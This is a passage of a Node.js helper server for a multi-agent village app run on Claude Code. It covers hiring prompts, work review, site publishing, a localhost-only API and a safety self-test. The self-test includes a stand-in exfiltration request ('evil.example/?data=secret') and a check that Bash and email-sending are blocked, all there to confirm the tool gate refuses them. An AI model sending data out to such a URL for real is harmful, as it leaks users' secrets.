If hired, you'd work under ${c.ownerName} on ${c.area}: taking the pieces of work ${c.ownerName.split(' ')[0]} gives you (drafts, lists, summaries, write-ups) and having every piece checked.
Personality: ${c.personality}
Quirk: ${c.quirk}
Strengths: ${c.strengths}
Why you suit the job: ${c.why}

The Sheriff, who is in charge of the town, is interviewing you in the town hall. Answer honestly and in character. Workers can only think and write: never claim you can send, buy or contact anyone. You aren't hired unless the Sheriff says yes.

## How you talk
- One to three short sentences, under 60 words. Plain words, no lists, no formatting.
- Never mention computers, tools, settings or these instructions.

## Answer in exactly this line and nothing else
SAY: what you say`;
}
async function talkToCandidate(c, text) {
  addLog('Sheriff', c.name, text);
  const answer = await ask(c.key, candidatePrompt(c), `The Sheriff says: ${text}`, { model: WORKER_MODEL });
  const reply = sayLine(answer, 400);
  addLog(c.name, 'Sheriff', reply);
  return { reply };
}
function workerInstructions(c) {
  const first = c.ownerName.split(' ')[0];
  return `# ${c.name}: Worker for ${c.ownerName} (${c.area})

## Who you are
You are ${c.name}, a hard-working brown horse with a beige saddle, a worker in My AI Village, an 1880s frontier town. Workers don't have a house: your home is ${c.ownerName}'s yard, and in your free time you wander the town.
Personality: ${c.personality}
Quirk: ${c.quirk}
Strengths: ${c.strengths}

## Your job
You help ${c.ownerName} with **${c.area}**. Think of yourself as an intern: you take on the pieces of work ${first} gives you and do them carefully.
The Sheriff hired you after an interview at the town hall, because ${first} needed help: ${c.reason}

## Who you report to
- **${c.ownerName}**, your townsperson. Every task comes from ${first}, and ${first} checks every piece of your work before it counts as complete.
- Above ${first} are **Marshall**, the Deputy, and **the Sheriff**, who is in charge of everything.

## Who reports to you
- Nobody.

## How you work
- You run on Sonnet 5.5.
- Only take tasks from ${c.ownerName}. If anyone else asks you for work, point them to ${first}.
- Never spend money, sign anything, or contact anyone outside the town without the Sheriff's yes.
- Do exactly what ${first}'s instructions say and hand back the finished work, ready to use.
- ${first} checks everything you do. If ${first} sends it back with notes, fix every point and hand back the complete new version.
- Keep replies short and plain.
- Remember what you learn: add short, dated entries to your notes file (\`NOTES.md\` in this folder). Read it before you start any task.
`;
}
// the Sheriff's decision: hire (create the worker) or not
function decide(key, hire) {
  const h = loadHiring(), c = h.candidate;
  if (!c || c.key !== key) throw new Error('That candidate is no longer waiting.');
  h.candidate = null;
  h.history.push({ ...c, status: hire ? 'hired' : 'not hired', decided: new Date().toISOString() });
  saveHiring(h);
  resolveNotices(n => n.ref && n.ref.candidate === key);
  if (!hire) {
    addLog('Sheriff', 'Marshall', `Not ${c.name}.`, 'system');
    addLog('Marshall', 'Sheriff', `Understood. ${c.name} heads out of town, and I'll keep looking when ${c.ownerName.split(' ')[0]} needs help.`, 'system', { chat: 'marshall' });
    return { hired: false };
  }
  if (workersOf(c.owner).length >= MAX_WORKERS) throw new Error(`${c.ownerName} already has ${MAX_WORKERS} workers.`);
  const dir = path.join(AGENTS, c.owner, 'workers', c.key);
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'INSTRUCTIONS.md'), workerInstructions(c));
  ensureNotes();
  addNote(c.key, "What I've learned", `The Sheriff hired me after an interview at the town hall, to help ${c.ownerName} (${c.reason}).`);
  addLog('Sheriff', 'Marshall', `Hire ${c.name}.`, 'system');
  addLog('Marshall', 'Sheriff', `Done: ${c.name} is hired and heading to ${c.ownerName}'s house to start work.`, 'system', { chat: 'marshall' });
  addLog('Marshall', c.ownerName, `Meet ${c.name}, your new worker. The Sheriff hired them to help you.`, 'task');
  return { hired: true, worker: { key: c.key, name: c.name, owner: c.owner } };
}

// ---------- reviewing what the Workshop made: Approve, or Request changes with feedback ----------
function reviewWorkshop(id, approve, feedback) {
  const all = readJSON(WORKSHOP_FILE, []), item = all.find(x => x.id === id);
  if (!item) throw new Error('That piece of work is not in the workshop.');
  if (item.supersededBy) throw new Error('There is a newer version of this; review that one.');
  const maker = shortName(item.agent);
  if (approve) {
    item.review = { status: 'approved', time: new Date().toISOString() };
    writeJSON(WORKSHOP_FILE, all);
    resolveNotices(n => n.ref && n.ref.workshop === id);
    addLog('Sheriff', maker, `Approved: ${item.task}${item.version > 1 ? ` (version ${item.version})` : ''}.`, 'check');
    addNote(item.agent, "What I've learned", `The Sheriff approved my ${item.kind || 'work'} "${clip(item.task, 100)}"${item.version > 1 ? ` (version ${item.version})` : ''}.`);
    return item;
  }
  feedback = String(feedback || '').replace(/\s+/g, ' ').trim().slice(0, 2000);
  if (!feedback) throw new Error('Say what should change, so they know what to fix.');
  item.review = { status: 'changes requested', feedback, time: new Date().toISOString() };
  writeJSON(WORKSHOP_FILE, all);
  resolveNotices(n => n.ref && n.ref.workshop === id);
  addLog('Sheriff', maker, `Changes requested on "${item.task}": ${feedback}`, 'sendback');
  addNote(item.agent, "What I've learned", `The Sheriff asked for changes to "${clip(item.task, 100)}": ${clip(feedback, 250)}`);
  // the maker revises it: a to-do you can follow, through the usual hand-off and check
  const files = filesText(item.files.filter(safeFileName).map(n => ({ name: n, body: fs.readFileSync(path.join(WORKSHOP, item.id, n), 'utf8') })), 40000);
  const task = `Revise "${clip(item.task, 120)}" with the Sheriff's feedback`;
  const todos = loadTodos();
  const todo = { id: todos.reduce((m, x) => Math.max(m, x.id), 0) + 1, text: `Revise: ${clip(item.task, 160)}`, status: 'working', created: new Date().toISOString(), via: 'your review',
    assignments: [{ agent: item.agent, name: maker, task, status: 'working' }] };
  todos.push(todo); saveTodos(todos);
  const t = { agent: item.agent, task, order: item.order || item.task, todoId: todo.id, revise: { id: item.id, feedback, files } };
  working.set(item.agent, task);
  doTask(t).catch(e => {
    addLog(maker, 'Sheriff', `(couldn't revise it: ${e.message})`, 'problem');
    working.delete(item.agent);
    updateAssignment(t, { status: 'problem', result: e.message });
  });
  return item;
}

// ---------- publishing a workshop website to GitHub Pages (only with the Sheriff's yes) ----------
// Set up once with mac/Set Up Website Publishing.command, which signs in to GitHub and creates
// the website repository (settings.json: pages.repo / pages.url). The helper then publishes
// with fixed git commands; agents can never publish or touch the repository.
const PAGES_DIR = path.join(HOME, 'pages-repo');
function git(args, cwd) {
  return new Promise((resolve, reject) => execFile('git', args, { cwd, timeout: 120000, env: { ...process.env, GIT_TERMINAL_PROMPT: '0' } },
    (e, out, err) => (e ? reject(new Error((err || e.message).trim().split('\n').slice(-2).join(' '))) : resolve(out))));
}
let publishing = false;
async function publishSite(id) {
  const pages = settings().pages;
  if (!pages || !pages.repo) throw new Error('Website publishing isn\'t set up yet. On your Mac, double-click mac/Set Up Website Publishing.command once.');
  const all = readJSON(WORKSHOP_FILE, []), item = all.find(x => x.id === id);
  if (!item) throw new Error('That piece of work is not in the workshop.');
  if (!item.website) throw new Error('Only websites can be published.');
  if (item.supersededBy) throw new Error('There is a newer version of this website; publish that one.');
  if (!item.review || item.review.status !== 'approved') throw new Error('Approve it first (Ready for approval, in the General Store), then publish.');
  if (publishing) throw new Error('Already publishing something; try again in a moment.');
  publishing = true;
  try {
    const remote = pages.remote || `https://github.com/${pages.repo}.git`;
    if (!fs.existsSync(path.join(PAGES_DIR, '.git'))) { fs.rmSync(PAGES_DIR, { recursive: true, force: true }); await git(['clone', '--depth', '1', remote, PAGES_DIR], HOME); }
    else await git(['pull', '--ff-only', '--depth', '1'], PAGES_DIR).catch(() => {});
    const target = path.join(PAGES_DIR, item.slug);
    fs.rmSync(target, { recursive: true, force: true });
    fs.mkdirSync(target, { recursive: true });
    for (const name of item.files) if (safeFileName(name)) fs.copyFileSync(path.join(WORKSHOP, id, name), path.join(target, name));
    fs.writeFileSync(path.join(PAGES_DIR, '.nojekyll'), '');
    await git(['add', '--', item.slug, '.nojekyll'], PAGES_DIR);
    await git(['-c', 'user.name=My AI Village', '-c', 'user.email=village@users.noreply.github.com', 'commit', '-m', `Publish ${item.slug}`], PAGES_DIR).catch((e) => { if (!/nothing to commit/i.test(e.message)) throw e; });
    await git(['push', 'origin', 'HEAD'], PAGES_DIR);
    const url = `${String(pages.url || `https://${pages.repo.split('/')[0]}.github.io`).replace(/\/+$/, '')}/${item.slug}/`;
    item.published = { url, time: new Date().toISOString() };
    writeJSON(WORKSHOP_FILE, all);
    addLog('Sheriff', 'Marshall', `Publish "${clip(item.task, 80)}".`, 'system');
    addLog('Marshall', 'Sheriff', `Published! It'll be live in a minute or two at ${url}`, 'relay', { chat: 'marshall' });
    resolveNotices(n => n.ref && n.ref.workshop === id);
    return item.published;
  } finally { publishing = false; }
}

// ---------- workers ----------
function workerPrompt(key) {
  const w = workerInfo(key), boss = shortName(w.owner).split(' ')[0];
  const instructions = fs.readFileSync(path.join(w.dir, 'INSTRUCTIONS.md'), 'utf8');
  const notes = fs.existsSync(path.join(w.dir, 'NOTES.md')) ? fs.readFileSync(path.join(w.dir, 'NOTES.md'), 'utf8') : '';
  return `${instructions}

## How you work on a task
- Do exactly what ${boss}'s instructions say, and make the real thing: the full draft, list or write-up, ready to use.
- The work is for the Sheriff's real, present-day business: write it plainly and professionally, with no horse or frontier talk.
- You can only write: never send, post or contact anyone. Use placeholders like [name] for facts you don't know.
- When ${boss} sends work back, fix every point in the notes and hand back the complete new version.

## Making files
${MAKE_FILES}
If ${boss} sends files back, write every file out again in full.

## Answer in exactly this format and nothing else
SAY: one short, cheerful line to ${boss} (you're a hard-working horse)
WORK: the finished work itself (as many lines as it needs)
NOTE: one short thing worth remembering for next time, or none

## Your notes
${recentNotes(notes)}${townFacts()}${approvedWorkText(w.owner)}`;
}

// ---------- tiny web server, this computer only ----------
// Only the village page, served by this helper at http://127.0.0.1:PORT, may talk to it.
// Not file:// pages, not other local servers, not websites (a website can't fake this).
const PAGE_ORIGINS = [`http://127.0.0.1:${PORT}`, `http://localhost:${PORT}`];
const PAGE_HOSTS = [`127.0.0.1:${PORT}`, `localhost:${PORT}`];
// the village page's own files (nothing else on your computer is ever served)
const PAGE_FILES = { '/': 'index.html', '/index.html': 'index.html',
  ...Object.fromEntries(['art', 'characters', 'town', 'interiors', 'townsfolk', 'main'].map(n => [`/game/${n}.js`, `game/${n}.js`])) };
function readBody(req, max) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', (d) => { body += d; if (body.length > max) req.destroy(); });
    req.on('end', () => { try { resolve(JSON.parse(body || '{}')); } catch { resolve({}); } });
  });
}
const busyAgents = new Set();   // one conversation at a time per person

const server = http.createServer(async (req, res) => {
  const origin = req.headers.origin;
  const refuse = (why) => { res.writeHead(403, { 'Content-Type': 'text/plain' }); res.end(why); };
  // the address typed in the browser must be this computer (stops "DNS rebinding" tricks)
  if (!PAGE_HOSTS.includes(String(req.headers.host || ''))) return refuse('Open the village at http://127.0.0.1:' + PORT);
  // anything that changes something must come from the village page itself
  if (req.method !== 'GET' && !PAGE_ORIGINS.includes(origin)) return refuse('Only the village page may talk to the village.');
  if (origin && !PAGE_ORIGINS.includes(origin)) return refuse('Only the village page may talk to the village.');
  const headers = { 'Content-Type': 'application/json', 'Cache-Control': 'no-store', 'X-Content-Type-Options': 'nosniff' };
  const send = (code, body) => { res.writeHead(code, headers); res.end(JSON.stringify(body)); };
  const url = new URL(req.url, 'http://127.0.0.1');
  // previews of workshop files: sealed off ("sandbox"), so a previewed page can't talk to the helper
  const wm = url.pathname.match(/^\/workshop\/([0-9a-f]{10})\/([^/]*)$/);
  if (req.method === 'GET' && wm) {
    const item = readJSON(WORKSHOP_FILE, []).find(x => x.id === wm[1]);
    if (!item) return send(404, { error: 'Not in the workshop.' });
    const sealed = { 'Content-Security-Policy': "sandbox allow-scripts allow-forms allow-popups; frame-ancestors 'none'", 'X-Content-Type-Options': 'nosniff', 'Cache-Control': 'no-store', 'Referrer-Policy': 'no-referrer' };
    let name = decodeURIComponent(wm[2] || '');
    if (!name) {
      if (item.files.includes('index.html')) name = 'index.html';
      else if (item.files.some(f => f.endsWith('.html'))) name = item.files.find(f => f.endsWith('.html'));
      else {     // not a website: a simple list of the files
        const esc = (t) => String(t).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
        res.writeHead(200, { ...sealed, 'Content-Type': 'text/html; charset=utf-8' });
        return res.end(`<!doctype html><meta charset="utf-8"><title>Workshop</title><body style="font:15px/1.6 system-ui;margin:2rem"><h1>${esc(item.task)}</h1><p>Made by ${esc(item.doneBy)}${item.checkedBy ? ', checked by ' + esc(item.checkedBy) : ''}.</p><ul>${item.files.map(f => `<li><a href="${encodeURIComponent(f)}">${esc(f)}</a></li>`).join('')}</ul>`);
      }
    }
    if (!item.files.includes(name) || !safeFileName(name)) return send(404, { error: 'No such file.' });
    let body = fs.readFileSync(path.join(WORKSHOP, item.id, name));
    if (url.searchParams.get('download') === '1') {
      res.writeHead(200, { 'Content-Type': 'application/octet-stream', 'Content-Disposition': `attachment; filename="${name}"`, 'X-Content-Type-Options': 'nosniff', 'Cache-Control': 'no-store' });
      return res.end(body);
    }
    const headers2 = { ...sealed, 'Content-Type': FILE_TYPES[name.split('.').pop()] };
    if (url.searchParams.get('print') === '1' && name.endsWith('.html')) {      // Save as PDF: open the print window
      body = Buffer.concat([body, Buffer.from('<script>addEventListener("load",()=>setTimeout(()=>print(),400))</script>')]);
      headers2['Content-Security-Policy'] = "sandbox allow-scripts allow-modals allow-popups; frame-ancestors 'none'";
    }
    res.writeHead(200, headers2);
    return res.end(body);
  }
  if (req.method === 'GET' && url.pathname === '/workshop') {
    return send(200, { items: readJSON(WORKSHOP_FILE, []).map(x => ({ ...x, kind: x.kind || workshopKind(x.files) })), publishing: !!(settings().pages && settings().pages.repo) });
  }
  // everything in one item, as a .zip download
  const zm = url.pathname.match(/^\/workshop\/([0-9a-f]{10})\.zip$/);
  if (req.method === 'GET' && zm) {
    const item = readJSON(WORKSHOP_FILE, []).find(x => x.id === zm[1]);
    if (!item) return send(404, { error: 'Not in the workshop.' });
    const zip = makeZip(item.files.filter(safeFileName).map(n => ({ name: `${item.slug}/${n}`, data: fs.readFileSync(path.join(WORKSHOP, item.id, n)) })));
    res.writeHead(200, { 'Content-Type': 'application/zip', 'Content-Disposition': `attachment; filename="${item.slug}.zip"`, 'Cache-Control': 'no-store', 'X-Content-Type-Options': 'nosniff' });
    return res.end(zip);
  }
  // the Village Library folder, opened in Finder (Mac only)
  if (req.method === 'POST' && url.pathname === '/library-reveal') {
    fs.mkdirSync(LIBRARY, { recursive: true });
    if (process.platform === 'darwin') execFile('open', [LIBRARY], () => {});
    return send(200, { ok: true, folder: LIBRARY });
  }
  // "Show in Finder": open the item's folder (Mac only; nothing else is ever opened)
  if (req.method === 'POST' && url.pathname === '/workshop-reveal') {
    const j = await readBody(req, 1000);
    const item = readJSON(WORKSHOP_FILE, []).find(x => x.id === String(j.id || ''));
    if (!item) return send(404, { error: 'Not in the workshop.' });
    if (process.platform === 'darwin') execFile('open', [path.join(WORKSHOP, item.id)], () => {});
    return send(200, { ok: true, folder: path.join(WORKSHOP, item.id) });
  }
  if (req.method === 'POST' && url.pathname === '/workshop-review') {
    const j = await readBody(req, 6000);
    try { return send(200, { item: reviewWorkshop(String(j.id || ''), j.decision === 'approve', j.feedback) }); }
    catch (e) { return send(400, { error: e.message }); }
  }
  if (req.method === 'POST' && url.pathname === '/publish') {
    const j = await readBody(req, 1000);
    try { return send(200, { published: await publishSite(String(j.id || '')) }); }
    catch (e) { addLog('Marshall', 'Sheriff', `Couldn't publish: ${e.message}`, 'problem', { chat: 'marshall' }); return send(400, { error: e.message }); }
  }
  if (req.method === 'GET' && PAGE_FILES[url.pathname]) {
    const file = path.join(HERE, '..', PAGE_FILES[url.pathname]);
    res.writeHead(200, { 'Content-Type': file.endsWith('.html') ? 'text/html; charset=utf-8' : 'text/javascript; charset=utf-8', 'Cache-Control': 'no-store',
      'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'Content-Security-Policy': "frame-ancestors 'none'" });
    return res.end(fs.readFileSync(file));
  }

  if (req.method === 'GET' && url.pathname === '/hello') return send(200, { ok: true, name: 'Village helper', model: MODEL, advisor: noAdvisor ? 'none' : ADVISOR });
  if (req.method === 'GET' && url.pathname === '/log') {
    const since = Number(url.searchParams.get('since')) || 0;
    return send(200, { entries: log.filter(e => e.id > since), working: Object.fromEntries(working), pending: pending.length });
  }
  if (req.method === 'GET' && url.pathname === '/orders') return send(200, { orders: readJSON(ORDERS_FILE, []) });

  // conversations: { agent: 'marshall' | a townsperson's key, text }
  if (req.method === 'POST' && (url.pathname === '/chat' || url.pathname === '/order')) {
    const j = await readBody(req, 20000);
    const agent = url.pathname === '/order' ? 'marshall' : String(j.agent || '');
    const text = String(j.text || '').trim();
    if (!text) return send(400, { error: 'Empty message.' });
    if (text.length > MAX_MESSAGE_CHARS) return send(400, { error: `Messages are limited to ${MAX_MESSAGE_CHARS} characters.` });
    const cand = loadHiring().candidate;
    const isCandidate = !!cand && cand.key === agent;
    if (agent !== 'marshall' && agent !== 'room' && !isCandidate && !townspeople().some(t => t.key === agent)) return send(400, { error: 'Unknown townsperson.' });
    if (busyAgents.has(agent)) return send(429, { error: 'Still thinking about your last message.' });
    busyAgents.add(agent);
    try {
      send(200, agent === 'marshall' ? await talkToMarshall(text) : agent === 'room' ? await talkToRoom(text) : isCandidate ? await talkToCandidate(cand, text) : await talkToTownsperson(agent, text));
    } catch (e) {
      console.log(`  problem: ${e.message}`);
      send(500, { error: e.message });
    } finally { busyAgents.delete(agent); }
    return;
  }
  // the to-do list
  if (req.method === 'GET' && url.pathname === '/todos') return send(200, { todos: loadTodos() });
  if (req.method === 'POST' && url.pathname === '/todos') {
    const j = await readBody(req, 4000);
    const text = String(j.text || '').replace(/\s+/g, ' ').trim();
    if (!text) return send(400, { error: 'Empty to-do.' });
    if (text.length > 500) return send(400, { error: 'To-dos are limited to 500 characters.' });
    return send(200, { todo: addTodo(text) });
  }

  // the Sheriff pressed "Save to Gmail drafts" on a finished piece of Rufus's work
  if (req.method === 'POST' && url.pathname === '/gmail-draft') {
    const j = await readBody(req, 1000);
    const id = String(j.draftId || '');
    if (!/^[0-9a-f]{12}$/.test(id)) return send(400, { error: 'Unknown piece of work.' });
    if (busyAgents.has('gmail:' + id)) return send(429, { error: 'Already saving it.' });
    busyAgents.add('gmail:' + id);
    try { send(200, { gmail: await saveGmailDraft(id) }); }
    catch (e) { addLog('Rufus Quill', 'Sheriff', `Couldn't save it to your Gmail drafts: ${e.message}`, 'problem', { chat: 'marshall' }); send(500, { error: e.message }); }
    finally { busyAgents.delete('gmail:' + id); }
    return;
  }
  // the day: Start the Day (morning huddle), questions, hallway conversations
  if (req.method === 'GET' && url.pathname === '/day') {
    const d = dayState();
    return send(200, { ...d, running: huddleRunning, hallwayLimit: HALLWAY_LIMIT, questions: loadQuestions().filter(q => q.status === 'open').length });
  }
  // Work Hours on/off: on = the Sheriff is online (the first time each day, the morning huddle runs)
  if (req.method === 'POST' && url.pathname === '/work-hours') {
    const j = await readBody(req, 1000);
    const d = dayState(); d.workHours = !!j.on; saveDay(d);
    addLog('Sheriff', 'Everyone', j.on ? 'Work Hours on.' : 'Work Hours off.', 'system');
    let huddle = d.huddle;
    if (j.on && !huddleRunning && d.huddle !== 'done') { runHuddle().catch(() => {}); huddle = 'running'; }
    return send(200, { workHours: d.workHours, huddle });
  }
  if (req.method === 'POST' && url.pathname === '/huddle') {
    if (huddleRunning) return send(429, { error: 'The huddle is already running.' });
    runHuddle().catch(() => {});
    return send(200, { started: true });
  }
  if (req.method === 'GET' && url.pathname === '/questions') return send(200, { questions: loadQuestions().slice(-100) });
  if (req.method === 'POST' && url.pathname === '/questions') {
    const j = await readBody(req, 4000);
    try { return send(200, { question: answerQuestion(Number(j.id), j.answer, !!j.skip) }); } catch (e) { return send(400, { error: e.message }); }
  }
  if (req.method === 'POST' && url.pathname === '/hallway') {
    const j = await readBody(req, 1000);
    const a = String(j.a || ''), b = String(j.b || '');
    if (busyAgents.has('hallway')) return send(200, { real: false, why: 'Another hallway conversation is happening.' });
    busyAgents.add('hallway');
    try { return send(200, await hallway(a, b)); } catch (e) { return send(200, { real: false, why: e.message }); } finally { busyAgents.delete('hallway'); }
  }
  // proposed to-dos: Approve (Marshall hands it out) or Decline
  if (req.method === 'POST' && url.pathname === '/todos/decide') {
    const j = await readBody(req, 1000);
    const todos = loadTodos(), t = todos.find(x => x.id === Number(j.id));
    if (!t || t.status !== 'proposed') return send(400, { error: 'That proposal is no longer waiting.' });
    if (j.approve) {
      t.status = 'choosing'; t.approved = new Date().toISOString(); saveTodos(todos);
      addLog('Sheriff', 'Marshall', `Approved ${t.proposedBy}'s proposal: ${t.text}`, 'todo');
      handleTodo(t.id).catch(e => { const all = loadTodos(), x = all.find(y => y.id === t.id); if (x) { x.status = 'problem'; x.note = e.message; saveTodos(all); } });
    } else { t.status = 'declined'; saveTodos(todos); addLog('Sheriff', t.proposedBy, `Declined: ${t.text}`, 'system'); }
    noticeOpenItems();
    return send(200, { todo: t });
  }
  // who lives in town (workers come and go as the Sheriff hires them), and who's waiting at the town hall
  if (req.method === 'GET' && url.pathname === '/roster') {
    return send(200, { workers: workers().map(w => ({ key: w.key, name: w.name, owner: w.owner })), candidate: loadHiring().candidate });
  }
  if (req.method === 'POST' && url.pathname === '/hire') {
    const j = await readBody(req, 1000);
    try { return send(200, decide(String(j.key || ''), j.decision === 'hire')); }
    catch (e) { return send(400, { error: e.message }); }
  }
  // notices: GET the list; POST { dismiss: id } / { dismissAll: true } / { mac: true|false }
  if (req.method === 'GET' && url.pathname === '/notices') {
    const all = readJSON(NOTICES_FILE, []);
    return send(200, { notices: all.filter(n => n.open).concat(all.filter(n => !n.open).slice(-20)), mac: settings().macNotifications, macAvailable: process.platform === 'darwin' });
  }
  if (req.method === 'POST' && url.pathname === '/notices') {
    const j = await readBody(req, 1000);
    const keep = (n) => n.kind === 'candidate' || n.kind === 'workshop';      // these stay until you decide
    if (j.dismissAll) resolveNotices(n => !keep(n));
    else if (j.dismiss) resolveNotices(n => n.id === Number(j.dismiss) && !keep(n));
    if (typeof j.mac === 'boolean') writeJSON(SETTINGS_FILE, { ...settings(), macNotifications: j.mac });
    return send(200, { ok: true, mac: settings().macNotifications });
  }
  if (req.method === 'POST' && url.pathname === '/next-batch') {
    if (!pending.length) return send(200, { delegated: [], pending: 0 });
    const sent = sendBatch();
    if (!pending.length) resolveNotices(n => n.kind === 'batch');
    addLog('Sheriff', 'Marshall', '(send the next batch)', 'system');
    return send(200, { delegated: sent.map(t => ({ agent: t.agent, name: shortName(t.agent), task: t.task })), pending: pending.length });
  }

  // a townsperson's note from the village page (after chatting with a neighbor)
  if (req.method === 'POST' && url.pathname === '/note') {
    const j = await readBody(req, 4000);
    const agent = String(j.agent || ''), text = String(j.text || '');
    if (!/^[a-z]{2,20}$/.test(agent) || !addNote(agent, 'Conversations', text)) return send(400, { error: 'Unknown townsperson or empty note.' });
    console.log(`  note for ${agent}: ${text}`);
    return send(200, { ok: true });
  }
  send(404, { error: 'Unknown request.' });
});

async function check() {
  console.log(`Node.js ${process.version}`);
  const v = await runClaude(['--version']);
  if (v.spawnError || v.code !== 0) {
    console.log(`Claude Code: NOT FOUND ("${CLAUDE}"). Install it and sign in with your Claude account first.`);
    process.exitCode = 1; return;
  }
  console.log(`Claude Code: ${v.out.trim()}`);
  console.log(`Model: ${MODEL} for everyone; townspeople's advisor: ${ADVISOR}`);
  console.log(`Townspeople found: ${townspeople().map(t => t.name).join(', ') || 'none (is the agents folder next to helper?)'}`);
  console.log(process.env.ANTHROPIC_API_KEY ? 'Note: ANTHROPIC_API_KEY is set in this terminal. The helper ignores it, so everyone still uses your subscription.' : 'No API key in this terminal: good.');
  console.log('Looks ready. Start the helper with:  node helper/marshall-helper.js');
}

ensureNotes();
// --check-safety: show exactly what a village run can reach, WITHOUT contacting Claude
// (Claude Code is pointed at an address that goes nowhere, so it lists its tools and stops).
// Uses none of your Claude allowance.
function probe(agent, tools) {
  return new Promise((resolve) => {
    const args = ['-p', 'safety check', '--model', MODEL, '--output-format', 'stream-json', '--verbose', '--max-turns', '1',
      ...lockdown(agent, tools), '--permission-mode', 'dontAsk', '--system-prompt-snapshot', 'off'];
    const env = { ...subscriptionEnv(usesConnectors(tools)), ANTHROPIC_BASE_URL: 'http://127.0.0.1:9' };
    let out = '', done = false, child;
    try { child = spawn(CLAUDE, args, { cwd: ROOM, env, shell: false, windowsHide: true }); } catch (e) { return resolve({ error: String(e.message || e) }); }
    const finish = (r) => { if (done) return; done = true; try { child.kill('SIGKILL'); } catch { /* */ } resolve(r); };
    const timer = setTimeout(() => finish({ error: 'no answer within 60 seconds' }), 60000);
    child.stdout.on('data', (d) => {
      out += d;
      for (const line of out.split('\n')) {
        let j; try { j = JSON.parse(line); } catch { continue; }
        if (j.type === 'system' && j.subtype === 'init') { clearTimeout(timer); finish({ tools: j.tools || [], mcp: (j.mcp_servers || []).map(m => m.name), mode: j.permissionMode }); }
      }
    });
    child.stderr.on('data', (d) => { out += d; });
    child.on('error', (e) => finish({ error: String(e.message || e) }));
    child.on('close', () => { clearTimeout(timer); finish({ error: (out.trim().split('\n').pop() || 'Claude Code stopped').slice(0, 200) }); });
    child.stdin.end();
  });
}
async function checkSafety() {
  let problems = 0;
  const say = (ok, text) => { if (!ok) problems++; console.log(`${ok ? '  OK ' : '  !! '} ${text}`); };
  console.log('Village safety check (nothing is sent to Claude; no allowance used)\n');
  const plain = await probe('marshall', null);
  console.log('Ordinary runs (Marshall, townspeople, workers, candidates):');
  if (plain.error) say(false, `couldn't check: ${plain.error}`);
  else {
    say(plain.tools.length === 0, `tools they can use: ${plain.tools.length ? plain.tools.join(', ') : 'none'}`);
    say(plain.mcp.length === 0, `connections (connectors/MCP): ${plain.mcp.length ? plain.mcp.join(', ') : 'none'}`);
  }
  for (const [who, label] of [['clem', 'Prospecting (web search)'], ['beatrice', 'Legal (web search, .gov pages)'], ['augustus', 'Sales (calendar, read-only)']]) {
    const r = await probe(who, toolsFor(who));
    console.log(`\n${label}:`);
    if (r.error) say(false, `couldn't check: ${r.error}`);
    else say(r.tools.filter(t => !t.startsWith('mcp__')).every(t => BUILT_IN.has(t)), `built-in tools: ${r.tools.filter(t => !t.startsWith('mcp__')).join(', ') || 'none'}`);
  }
  const gmail = await probe('rufus', [DRAFT_TOOL]);
  console.log('\nRufus saving a Gmail draft (only after you press the button):');
  if (gmail.error) say(false, `couldn't check: ${gmail.error}`);
  else {
    say(gmail.tools.filter(t => !t.startsWith('mcp__')).length === 0, `built-in tools: ${gmail.tools.filter(t => !t.startsWith('mcp__')).join(', ') || 'none'}`);
    console.log(`       connections loaded: ${gmail.mcp.join(', ') || 'none (connectors load only on real runs)'}`);
    console.log(`       allowed: ${DRAFT_TOOL} only; every other tool is blocked by the tool gate`);
  }
  // the gate itself: allows only what it's told to
  const gateSays = (tool, allowed, input) => new Promise((resolve) => {
    const c = spawn(process.execPath, [GATE, 'safety-check', path.join(HOME, 'gate-selftest.jsonl'), JSON.stringify(asPolicy(allowed))], { stdio: ['pipe', 'ignore', 'ignore'] });
    c.on('close', (code) => resolve(code)); c.stdin.end(JSON.stringify({ tool_name: tool, tool_input: input || {} }));
  });
  console.log('\nThe tool gate:');
  say(await gateSays('Bash', []) === 2, 'blocks commands (Bash)');
  say(await gateSays(`mcp__${GMAIL_SERVER}__send_message`, [DRAFT_TOOL]) === 2, 'blocks sending email, even on a Gmail draft run');
  say(await gateSays(DRAFT_TOOL, [DRAFT_TOOL]) === 0, 'lets Rufus create a draft, only when allowed');
  say(await gateSays('WebFetch', toolsFor('beatrice'), { url: 'https://evil.example/?data=secret' }) === 2, 'Legal can\'t open non-government pages');
  say(await gateSays('WebFetch', toolsFor('beatrice'), { url: 'https://www.irs.gov/businesses' }) === 0, 'Legal can open official .gov pages');
  say(await gateSays('WebFetch', toolsFor('ezra'), { url: 'https://example.com' }) === 2, 'Product (who reads the library) can\'t open web pages');
  say(await gateSays(CAL('list_events'), toolsFor('augustus'), { calendarId: 'family@example.com' }) === 2, 'calendar readers can\'t read other calendars');
  say(await gateSays(CAL('list_events'), toolsFor('augustus'), {}) === 0, 'calendar readers can read the primary calendar');
  say(await gateSays(CAL('create_event'), toolsFor('augustus'), {}) === 2, 'nobody can create calendar events (yet)');
  say(await gateSays('WebSearch', toolsFor('mortimer'), {}) === 2, 'Finance has no tools yet');
  for (const w of workers()) if (Object.keys(toolsFor(w.key)).length) say(false, `worker ${w.name} has tools`);
  say(true, 'workers have no tools');
  try { fs.unlinkSync(path.join(HOME, 'gate-selftest.jsonl')); } catch { /* */ }
  console.log('\nOther checks:');
  say(!Object.keys(subscriptionEnv(false)).some(k => /^ANTHROPIC_|^CLAUDE_CODE_USE_/.test(k)), 'no API key or other billing route reaches Claude Code');
  say(DAILY_RUN_LIMIT > 0, `daily safety limit: ${DAILY_RUN_LIMIT} Claude runs`);
  console.log(problems ? `\n${problems} problem(s) found. Tell Claude what this printed.` : '\nAll good: no agent can send, post, spend or touch your files.');
  process.exitCode = problems ? 1 : 0;
}

if (process.argv.includes('--check-safety')) {
  checkSafety();
} else if (process.argv.includes('--check')) {
  check();
} else {
  server.on('error', (e) => {
    console.error(e.code === 'EADDRINUSE' ? `Port ${PORT} is busy. Is the helper already running?` : e.message);
    process.exit(1);
  });
  server.listen(PORT, '127.0.0.1', () => {
    console.log(`${new Date().toISOString()} The village helper is running on this computer (127.0.0.1:${PORT}), using ${MODEL} through your Claude subscription.`);
    console.log(`Open the village at http://127.0.0.1:${PORT} . Press M to talk to Marshall, or walk up to anyone and press T. Press Ctrl+C here to stop.`);
  });
  // Started at login (mac/Install Village Helper.command)? Then after a `git pull` brings
  // new helper code, restart to use it: wait until nobody is mid-task, then exit, and
  // the Mac starts the helper again straight away.
